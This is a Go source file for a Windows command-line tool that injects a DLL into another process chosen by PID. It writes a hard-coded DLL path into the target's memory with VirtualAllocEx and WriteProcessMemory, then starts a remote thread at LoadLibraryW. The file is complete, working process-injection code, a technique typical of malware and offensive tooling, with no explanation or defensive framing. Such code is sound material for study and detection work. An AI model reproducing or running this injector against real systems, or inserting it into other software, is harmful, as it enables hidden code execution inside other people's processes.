package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"unsafe"
)

func main() {

	if len(os.Args) < 2 {
		fmt.Printf("PID not provided. Usage: dllinject.exe <PID>\n")
		os.Exit(1)
	}

	pid, err := strconv.ParseUint(os.Args[1], 10, 32)
	if err != nil {
		fmt.Printf("Invalid PID: %v\n", err)
		os.Exit(1)
	}
	pid32 := uint32(pid)

	kernel32dll := windows.NewLazyDLL("kernel32.dll")

	// Get handle for kernel32 dll
	pGetModuleHandleW := kernel32dll.NewProc("GetModuleHandleW")
	hKernel32, _, _ := pGetModuleHandleW.Call(uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("kernel32.dll"))))
	fmt.Printf("Got {%v} handle to kernel32!\n", hKernel32)

	dllPath := "C:\\Users\\Administrator\\mdev\\dllInject\\winregx64.dll"
	dllUTF16, err := windows.UTF16FromString(dllPath)
	if err != nil {
		fmt.Printf("Failed to convert path: %v\n", err)
		os.Exit(1)
	}
	dllSize := uintptr(len(dllUTF16) * 2)

	pOpenProcess := kernel32dll.NewProc("OpenProcess")
	minPerms := uint32(windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_CREATE_THREAD)
	hProcess, _, errOpen := pOpenProcess.Call(uintptr(minPerms), uintptr(0), uintptr(pid32))
	if hProcess == 0 {
		fmt.Printf("OpenProcess failed: %v\n", errOpen)
		os.Exit(1)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")
	rAddr, _, errAlloc := pVirtualAllocEx.Call(
		hProcess,
		uintptr(0),
		dllSize,
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE))
	if rAddr == 0 {
		fmt.Printf("VirtualAllocEx failed: %v\n", errAlloc)
		os.Exit(1)
	}

	pWriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
	rWrite, _, errWrite := pWriteProcessMemory.Call(
		uintptr(hProcess),
		rAddr,
		uintptr(unsafe.Pointer(&dllUTF16[0])),
		dllSize,
		uintptr(0),
	)
	if rWrite == 0 {
		fmt.Printf("WriteProcessMemory failed: %v\n", errWrite)
		os.Exit(1)
	}

	pLoadLibraryW := kernel32dll.NewProc("LoadLibraryW")
	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")

	var tid uint32
	hThread, _, errT := pCreateRemoteThreadEx.Call(
		hProcess,
		uintptr(0),
		uintptr(0),
		pLoadLibraryW.Addr(),
		rAddr,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&tid)),
	)
	if hThread == 0 {
		fmt.Printf("CreateRemoteThreadEx failed: %v\n", errT)
		os.Exit(1)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	fmt.Printf("DLL Inject: Ok! TID: %v\n", tid)

	event, errWait := windows.WaitForSingleObject(windows.Handle(hThread), 5000)
	if errWait != nil {
		fmt.Printf("WaitForSingleObject: %v\n", errWait)
	}

	fmt.Printf("Event Created: %v\n", event)
}
